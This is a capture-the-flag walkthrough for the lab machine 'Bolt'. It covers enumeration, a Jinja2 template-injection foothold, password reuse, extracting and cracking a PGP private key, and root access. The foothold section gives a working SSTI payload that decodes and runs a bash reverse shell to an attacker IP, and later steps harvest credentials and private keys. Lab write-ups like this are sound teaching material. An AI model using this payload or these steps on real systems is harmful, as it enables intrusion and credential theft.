# Enumration

## Nmap Scan

```text
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
```

## Enumrating port 80
Downloadable `image.tar`

Found `db.sqlite3` which contains hashed password for **admin** account

```shell
┌──(kali㉿kali)-[~/Documents/Bolt/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2]
└─$ sqlitebrowser db.sqlite3 
```

Login in http://bolt.htb/ with **admin** credentials after cracking the hash

Website seems to be build using `Jinja Template` which have a `SSTI` vuln

## Fuzzing Sub-Domains on port 80

On fuzzing for Sub-Domains found :
- `mail.bolt.htb` <== Mail
- `demo.bolt.htb/register` ⇐ Demo site avalible register with Invite-Code

> The Invite Code can also be found in `image.tar`
> ```text
> ┌──(kali㉿kali)-[~/Documents/Bolt/image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base]
> └─$ cat routes.py
> ```

---

# Foothold
After registering at http://demo.bolt.htb/ we can login at https://mail.bolt.htb/ with same credentials

**SSTI vuln** after changes in username in http://demo.bolt.htb/ and conforming the changes through mail in http://mail.bolt.htb/ we can get a reverse shell

- [SSTI Explanation](https://secure-cookie.io/attacks/ssti/)
- [Formaing payload to get Shell](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

```text
Payload :
{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzMvNDI0MiAwPiYxCg== | base64 -d | bash')['read']() == 'chiv' %} a {% endif %}
```

---

# Getting User

**MySQL** credentails can be found in file `/etc/passbolt/passbolt.php`

> Password for **MySQL** is reused as **SSH** for `eddie` user


# Priv ESC

After **SSH** in **eddie** we can see there is a mail for the user, We can read it using:
```bash
cat /var/mail/eddie
```

> Mail highlight security concern regarding **Passbolt PGP related Browser Extension** which stores the Private keys locally on machine

### Enumrating MySQL
a **PGP** message was found inside `secrets` table

To Decrypt a **PGP Message** we need **PGP Private Key** of eddie

### Private Key

To find Private Key :
```shell
grep -re "PGP PRIVATE"
```

And some File matchs the pattern, out of them 

```
strings Default/Local\ Extension\ Settings/didegimhafipceonhjepacocaffmoppf/000003.log 
```
Key can be read but it contains some not useful characters
So after copy pasting, open file in `vi`
do :
```text
:%s/\\\\r\\\\n/\r\/g
```
to clean up the file

Now crack the Private key to find the **PassPhrase** protecting the private key using **John**

1. Convert **PGP** key into **John** friendly format using `gpg2john`
	```shell
	gpg2john private.key > final.txt
	```
2. Crack using **JOHN**
	```shell
	john --wordlist=/usr/share/wordlist/rockyou.txt final.txt
	```

### Decrypting PGP Message

All Components needed to Decrypt the Message
1. PGP Messsage
2. Passphrase
3. PGP Private Key

Decrypt the **PGP** message from

- https://codref.org/pgp

## 💥 Become Root
```shell
su root
```
